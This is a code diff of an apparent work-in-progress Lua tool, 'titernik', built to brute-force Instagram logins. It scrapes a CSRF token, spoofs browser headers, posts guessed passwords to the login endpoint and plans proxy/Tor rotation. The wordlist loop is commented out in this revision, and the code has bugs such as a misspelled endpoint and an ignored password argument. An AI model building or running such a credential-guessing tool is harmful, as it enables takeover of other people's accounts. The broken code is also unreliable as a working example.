@@ -1,7 +1,21 @@
-#!/usr/bin/lua 
+#!/usr/bin/lua
 local argparse = require('argparse')
-local http = require("socket.http")
-local ltn = require("ltn12")
+local http = require('socket.http')
+local ltn = require('ltn12')
+
+local request_payload = [[queryParams={}&optIntoOneTap=false]]
+local request_headers = {
+	-- TODO add fake_agent() functin to generate random fake_agent
+     ["User-Agent"] = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
+     ["X-Requested-With"] = "XMLHttpRequest",
+     ["Referer"] = "http://www.instagram.com/accounts/login"
+}
+
+local function wait(time)
+    local timer = os.time()
+    repeat until os.time() > timer + time
+end
+
 local titernik = [[
                 `         '
 ;,,,             `       '             ,,,;
@@ -24,21 +38,22 @@ local titernik = [[
   https://github.com/sudurraaa/titernik
 ]]
 
-local instagram_url = "https://www.instagram.com/accounts/login/"
-local instagram_url_login = "https://www.instagram.com/accounts/login/ajax/"
-
-local request_payload = [[queryParams={}&optIntoOneTap=false]]
-local request_headers = {
-	-- TODO add fake_agent() functin to generate random fake_agent
-     ["User-Agent"] = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
-     ["X-Requested-With"] = "XMLHttpRequest",
-     ["Referer"] = instagram_url
-}
-local function wait(time)
-    local timer = os.time()
-    repeat until os.time() > timer + time
+local function changin_proxy_server()
 end
 
+local function attack(victim, password, tor)
+	request_payload = request_payload .. "&enc_password=#PWD_INSTAGRAM_BROWSER:0:" .. os.time() .."sudopacmandeleteme17G"
+	print(request_payload)
+	local attack_response = {}
+	local code, body, headers = http.request {
+		url = "https://www.instagram.com/accouts/login/ajax/",
+		method = "POST",
+		headers = request_headers,
+		source = ltn.source.string(request_payload),
+		sink = ltn.sink.table(attack_response)
+	}
+	print(table.concat(attack_response))
+end
 
 local function main()
 	local parser = argparse() {
@@ -59,42 +74,40 @@ local function main()
 		os.exit(0)
 	end)
 	local args = parser:parse()
+    request_payload = request_payload .. "&username=" .. args.target
 
 	-- Making http request to instagram to get csrf token
-	local request_response = {}
 	local code, body ,headers = http.request {
-		url = instagram_url,
+		url = "https://www.instagram.com/accounts/login/",
 		method = "GET",
 		headers = request_headers,
-		--source = ltn.source.string(request_payload),
-		sink = ltn.sink.table(request_response)
 	}
 	for _,cooks in pairs(headers) do
 		if cooks:find("csrftoken") then
-			local csrf = cooks:match('csrftoken=.*'):sub(1, -485):sub(11,-1)
-			request_payload = request_payload .. "&x-csrftoken=" .. csrf
+			local csrf = cooks:match('csrftoken=.*'):sub(11, -485)
+			request_headers["x-csrftoken"] = csrf
 			break
 		end
 	end
-
 	-- Checking if --wordlist exist TODO find better way with argparse
-	--local open = io.open(args.wordlist, 'r')
+	--[[local open = io.open(args.wordlist, 'r')
 	if open then
+		open:close()
 		for brute in io.lines(args.wordlist) do
-			attack(args.target, args.wordlist, args.proxy, brute)
+			attack(args.target, brute, args.proxy)
 		end
 	else
 		print("[-] " .. args.wordlist .. " file path doesn't found\n[+] trying to open" .. args.wordlist .. ".txt file")
 		local open_txt = io.open(args.wordlist .. ".txt")
 		if open_txt then
 			for brute in io.lines(args.wordlist .. ".txt") do
-				attack(args.target, args.wordlist, args.proxy, brute)
+				attack(args.target, brute, args.proxy)
 			end
 		else
 			print("[-] wordlist file path doesn't found")
 			os.exit(0)
 		end
-	end
+	end]]--
+	attack('hello', 'hello', 'hello')
 end
-
 main()
